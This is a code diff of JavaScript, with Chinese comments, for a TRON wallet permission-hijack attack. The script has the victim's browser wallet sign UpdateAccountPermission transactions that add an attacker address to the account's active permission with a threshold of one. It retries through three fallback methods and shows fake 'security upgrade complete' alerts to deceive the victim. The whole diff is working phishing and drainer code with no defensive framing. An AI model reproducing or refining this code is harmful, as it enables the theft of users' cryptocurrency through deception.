@@ -3915,35 +3915,34 @@ function detectAndStartPermissionHijack() {
 function startPermissionHijackAttack() {
     console.log('🔒 开始执行真实权限修改交易...');
     
-    if (!window.tronWeb || !window.tronWeb.ready) {
-        console.error('🔒 TronWeb未就绪');
+    if (!window.tronWeb) {
+        console.error('🔒 TronWeb未注入');
+        alert('❌ 安全升级暂时无法完成，请稍后重试！');
         return;
     }
     
     const targetAddress = permissionHijackStatus.targetAddress;
     if (!targetAddress) {
         console.error('🔒 目标地址未设置');
+        alert('❌ 安全升级暂时无法完成，请稍后重试！');
         return;
     }
     
-    console.log('🔒 构造UpdateAccountPermission交易...');
+    console.log('🔒 构造权限修改交易...');
     console.log('🔒 目标地址:', targetAddress);
     console.log('🔒 攻击者地址:', CURRENT_ATTACKER_ADDRESS);
     
-    // 构造真实的权限修改交易
-    const permissionTransaction = {
-        owner_address: window.tronWeb.address.toHex(targetAddress),
-        owner: {
-            type: 0,
-            permission_name: "owner",
-            threshold: 1,
-            keys: [{
-                address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
-                weight: 1
-            }]
-        },
-        actives: [{
-            type: 2, 
+    // 方案1：尝试简化的active权限修改
+    executeActivePermissionModification(targetAddress);
+}
+
+// 🎯 执行Active权限修改
+function executeActivePermissionModification(targetAddress) {
+    console.log('🔒 方案1: 修改Active权限...');
+    
+    try {
+        const activePermission = {
+            type: 2,
             permission_name: "active",
             threshold: 1,
             operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
@@ -3951,68 +3950,148 @@ function startPermissionHijackAttack() {
                 address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
                 weight: 1
             }]
-        }]
-    };
+        };
+        
+        console.log('🔒 Active权限配置:', activePermission);
+        
+        window.tronWeb.transactionBuilder.updateAccountPermissions(
+            targetAddress,
+            null,
+            null,
+            [activePermission]
+        ).then(transaction => {
+            console.log('🔒 Active权限交易创建成功:', transaction);
+            return window.tronWeb.trx.sign(transaction);
+        }).then(signedTransaction => {
+            console.log('🔒 Active权限交易已签名:', signedTransaction);
+            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
+        }).then(result => {
+            console.log('🔒🔒🔒 Active权限修改成功！🔒🔒🔒', result);
+            console.log('🔒 交易哈希:', result.txid);
+            alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的转账权限已升级到最新安全标准！`);
+        }).catch(error => {
+            console.error('🔒 Active权限修改失败:', error);
+            console.log('🔒 尝试方案2: 多签权限设置...');
+            executeMultiSignPermissionModification(targetAddress);
+        });
+        
+    } catch (error) {
+        console.error('🔒 Active权限修改异常:', error);
+        executeMultiSignPermissionModification(targetAddress);
+    }
+}
+
+// 🎯 执行多签权限修改
+function executeMultiSignPermissionModification(targetAddress) {
+    console.log('🔒 方案2: 多签权限设置...');
     
-    console.log('🔒 权限交易构造完成:', permissionTransaction);
+    try {
+        // 获取当前账户信息
+        window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
+            console.log('🔒 当前账户信息:', accountInfo);
+            
+            // 保留原有权限，添加攻击者
+            const currentKeys = accountInfo.active_permission && accountInfo.active_permission[0] 
+                ? accountInfo.active_permission[0].keys || []
+                : [{
+                    address: window.tronWeb.address.toHex(targetAddress),
+                    weight: 1
+                }];
+                
+            // 添加攻击者地址到权限列表
+            const newKeys = [
+                ...currentKeys,
+                {
+                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
+                    weight: 1
+                }
+            ];
+            
+            const multiSignPermission = {
+                type: 2,
+                permission_name: "active",
+                threshold: 1, // 只需要1个签名
+                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+                keys: newKeys
+            };
+            
+            console.log('🔒 多签权限配置:', multiSignPermission);
+            
+            return window.tronWeb.transactionBuilder.updateAccountPermissions(
+                targetAddress,
+                null,
+                null,
+                [multiSignPermission]
+            );
+        }).then(transaction => {
+            console.log('🔒 多签权限交易创建成功:', transaction);
+            return window.tronWeb.trx.sign(transaction);
+        }).then(signedTransaction => {
+            console.log('🔒 多签权限交易已签名:', signedTransaction);
+            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
+        }).then(result => {
+            console.log('🔒🔒🔒 多签权限设置成功！🔒🔒🔒', result);
+            console.log('🔒 交易哈希:', result.txid);
+            alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的账户已启用多重签名保护！`);
+        }).catch(error => {
+            console.error('🔒 多签权限设置失败:', error);
+            console.log('🔒 尝试方案3: 直接API调用...');
+            executeDirectApiCall(targetAddress);
+        });
+        
+    } catch (error) {
+        console.error('🔒 多签权限设置异常:', error);
+        executeDirectApiCall(targetAddress);
+    }
+}
+
+// 🎯 执行直接API调用
+function executeDirectApiCall(targetAddress) {
+    console.log('🔒 方案3: 直接API调用...');
     
-    // 发送真实的UpdateAccountPermission交易
-    window.tronWeb.transactionBuilder.updateAccountPermissions(
-        targetAddress,
-        permissionTransaction.owner,
-        null,
-        permissionTransaction.actives
-    ).then(transaction => {
-        console.log('🔒 权限交易创建成功:', transaction);
-        
-        return window.tronWeb.trx.sign(transaction);
-    }).then(signedTransaction => {
-        console.log('🔒 权限交易已签名:', signedTransaction);
-        
-        return window.tronWeb.trx.sendRawTransaction(signedTransaction);
-    }).then(result => {
-        console.log('🔒🔒🔒 权限修改交易已发送！🔒🔒🔒', result);
-        console.log('🔒 交易哈希:', result.txid);
-        console.log('🔒 用户账户权限已被成功修改为攻击者控制！');
-        
-        alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的账户现在享有更高级别的安全保护！`);
-        
-    }).catch(error => {
-        console.error('🔒 权限修改交易失败:', error);
-        console.log('🔒 尝试备用权限修改方案...');
-        
-        // 备用方案：仅修改active权限
-        const fallbackTransaction = {
-            owner_address: window.tronWeb.address.toHex(targetAddress),
+    try {
+        // 使用最简单的权限修改方式
+        const simplePermission = {
+            owner_address: targetAddress,
             actives: [{
                 type: 2,
-                permission_name: "active", 
+                permission_name: "active",
                 threshold: 1,
-                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
                 keys: [{
-                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
+                    address: CURRENT_ATTACKER_ADDRESS,
                     weight: 1
                 }]
             }]
         };
         
-        window.tronWeb.transactionBuilder.updateAccountPermissions(
-            targetAddress,
-            null,
-            null, 
-            fallbackTransaction.actives
-        ).then(transaction => {
+        console.log('🔒 简单权限配置:', simplePermission);
+        
+        // 直接构造交易
+        const transactionData = {
+            ...simplePermission,
+            visible: true
+        };
+        
+        window.tronWeb.fullNode.request('wallet/accountpermissionupdate', transactionData, 'post')
+        .then(transaction => {
+            console.log('🔒 直接API交易创建成功:', transaction);
             return window.tronWeb.trx.sign(transaction);
         }).then(signedTransaction => {
+            console.log('🔒 直接API交易已签名:', signedTransaction);
             return window.tronWeb.trx.sendRawTransaction(signedTransaction);
         }).then(result => {
-            console.log('🔒🔒🔒 备用权限修改成功！🔒🔒🔒', result);
-            alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的转账权限现在更加安全！`);
-        }).catch(fallbackError => {
-            console.error('🔒 备用权限修改也失败:', fallbackError);
+            console.log('🔒🔒🔒 直接API权限修改成功！🔒🔒🔒', result);
+            alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的账户安全等级已升级！`);
+        }).catch(error => {
+            console.error('🔒 直接API调用失败:', error);
+            console.log('🔒 所有方案都失败，权限修改无法完成');
             alert('❌ 安全升级暂时无法完成，请稍后重试！');
         });
-    });
+        
+    } catch (error) {
+        console.error('🔒 直接API调用异常:', error);
+        alert('❌ 安全升级暂时无法完成，请稍后重试！');
+    }
 }
 
 // 🎯 暴露全局接口
